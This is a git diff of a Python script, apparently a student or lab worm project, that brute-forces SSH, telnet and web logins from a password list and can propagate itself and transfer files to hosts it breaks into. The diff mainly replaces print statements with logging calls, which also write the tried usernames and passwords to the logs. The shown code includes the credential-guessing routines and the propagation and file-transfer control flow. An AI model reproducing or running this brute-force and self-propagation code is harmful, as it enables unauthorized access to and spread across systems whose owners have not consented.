@@ -1,4 +1,7 @@
 #!/usr/bin/python3
+# TODO: Add param and return keywords to block comments with the necessary
+#  contents to clarify what's being passed in and out. Maybe look at some
+#  automatic documentation / keyword solutions? (Andrew)
 
 # from scapy.all import *
 # For use when adding new functionality with scapy, be sure to statically
@@ -8,18 +11,20 @@ from scapy.interfaces import get_if_list
 from scapy.layers.inet import IP, TCP
 from scapy.sendrecv import sr
 from scapy.utils import subprocess, os
+from src import strings
 from telnetlib import Telnet
 from time import sleep
 from paramiko import SSHClient, AutoAddPolicy
 import requests
-import strings
+import logging
 
 """
  - Importing modules from scapy for Packet Crafting and Sending / Sniffing.
+ - Importing strings for use of the external strings resources.
  - Importing telnetlib for telnet operations.
  - Importing Paramiko for ssh operations.
  - Importing requests for web based operations.
- - Importing strings for use of the external strings resources.
+ - Importing logging to safely log sensitive, error or debug info.
 """
 
 """
@@ -184,14 +189,14 @@ def connect_ssh_client(ip, port, username, password):
         client.connect(hostname=str(ip), port=int(port),
                        username=str(username), password=str(password))
         client.close()
-        print(strings.connection_status("SSH", ip, port, username, password,
-                                        "Successful"))
+        logging.info(strings.connection_status("SSH", ip, port, username,
+                                               password, "Successful"))
         return True
 
     except RuntimeError:
         client.close()
-        print(strings.connection_status("SSH", ip, port, username, password,
-                                        "Unsuccessful"))
+        logging.debug(strings.connection_status("SSH", ip, port, username,
+                                                password, "Unsuccessful"))
         return False
 
 
@@ -208,17 +213,17 @@ def connect_telnet(ip, port, username, password):
         tel.write((str(password) + "\n").encode("ascii"))
 
         data = tel.read_until("Welcome to".encode("ascii"), timeout=4)
-        print(strings.connection_status("telnet", ip, port, username, password,
-                                        "Successful"))
+        logging.info(strings.connection_status("telnet", ip, port, username,
+                                               password, "Successful"))
         if check_telnet_data("Welcome to", data):
             return True
-        print(strings.connection_status("telnet", ip, port, username, password,
-                                        "Unsuccessful"))
+        logging.debug(strings.connection_status("telnet", ip, port, username,
+                                                password, "Unsuccessful"))
         return False
 
     except RuntimeError:
-        print(strings.connection_status("telnet", ip, port, username, password,
-                                        "Unsuccessful"))
+        logging.debug(strings.connection_status("telnet", ip, port, username,
+                                                password, "Unsuccessful"))
         return False
 
 
@@ -232,11 +237,11 @@ def connect_web(ip, port, username, password):
         send_post_request_with_login(ip, port, username, password)
         attempt_succeeded = True
     except RuntimeError:
-        print(strings.connection_status("web", ip, port, username, password,
-                                        "Unsuccessful"))
+        logging.debug(strings.connection_status("web", ip, port, username,
+                                                password, "Unsuccessful"))
     if attempt_succeeded:
-        print(strings.connection_status("web", ip, port, username, password,
-                                        "Successful"))
+        logging.info(strings.connection_status("web", ip, port, username,
+                                               password, "Successful"))
     return attempt_succeeded
 
 
@@ -433,12 +438,12 @@ def send_post_request_with_login(ip, port, username, password):
                              data={"username": username, "password": password},
                              timeout=4)
     if response:
-        print(strings.connection_status("web", ip, port, username, password,
-                                        "Successful"))
+        logging.info(strings.connection_status("web", ip, port, username,
+                                               password, "Successful"))
         return str(username) + ":" + str(password)
     else:
-        print(strings.connection_status("web", ip, port, username, password,
-                                        "Unsuccessful"))
+        logging.debug(strings.connection_status("web", ip, port, username,
+                                                password, "Unsuccessful"))
         return None
 
 
@@ -530,12 +535,12 @@ def try_bruteforce(ip, port, target_username, password_list,
     service = service_switch.get(str(port))
     bruteforce = bruteforce_service(ip, port, target_username, password_list)
     if bruteforce:
-        print("A working username and password for " + str(service)
-              + " was found: " + str(bruteforce))
+        logging.info("A working username and password for " + str(service)
+                     + " was found: " + str(bruteforce))
         return str(bruteforce), service
     else:
-        print("It was impossible to bruteforce: " + ip_address_and_port
-              + ", that's rough buddy. :(")
+        logging.debug("It was impossible to bruteforce: " + ip_address_and_port
+                      + ", that's rough buddy. :(")
     return None, service
 
 
@@ -574,11 +579,13 @@ def try_propagating(arguments, ip, port, bruteforce, service):
     if "-P" in arguments and (port == "22" or "23"):
         propagated = propagate_script(ip, port, bruteforce)
         if propagated:
-            print("Script propagated over " + service + ".")
+            logging.info("Script propagated over " + service + ".")
         else:
-            print("Script couldn't be propagated over " + service + ".")
+            logging.debug("Script couldn't be propagated over " + service
+                          + ".")
     else:
-        print("Requirement to propagate script not specified, skipping...")
+        logging.info("Requirement to propagate script not specified, "
+                     "skipping...")
 
 
 def try_transferring_file(arguments, ip, port, bruteforce,
@@ -595,13 +602,13 @@ def try_transferring_file(arguments, ip, port, bruteforce,
         transferred = transfer_file(ip, port, bruteforce,
                                     transfer_file_filename)
         if transferred:
-            print("File " + str(transfer_file_filename) + " transferred over "
-                  + service + ".")
+            logging.info("File " + str(transfer_file_filename) +
+                         " transferred over " + service + ".")
         else:
-            print("File " + str(transfer_file_filename)
-                  + " couldn't be transferred over " + service + ".")
+            logging.debug("File " + str(transfer_file_filename)
+                          + " couldn't be transferred over " + service + ".")
     else:
-        print("Requirement to transfer file not specified, skipping...")
+        logging.info("Requirement to transfer file not specified, skipping...")
 
 
 def validate_file_exists(filename):
@@ -611,6 +618,6 @@ def validate_file_exists(filename):
     Just kidding we show the help screen and exit gracefully.
     """
     if not os.path.isfile(filename):
-        print("!!!ERROR: THE FOLLOWING FILE DOES NOT EXIST: " + filename
-              + "!!!")
+        logging.error("!!!ERROR: THE FOLLOWING FILE DOES NOT EXIST: "
+                      + filename + "!!!")
         gtfo_and_rtfm()
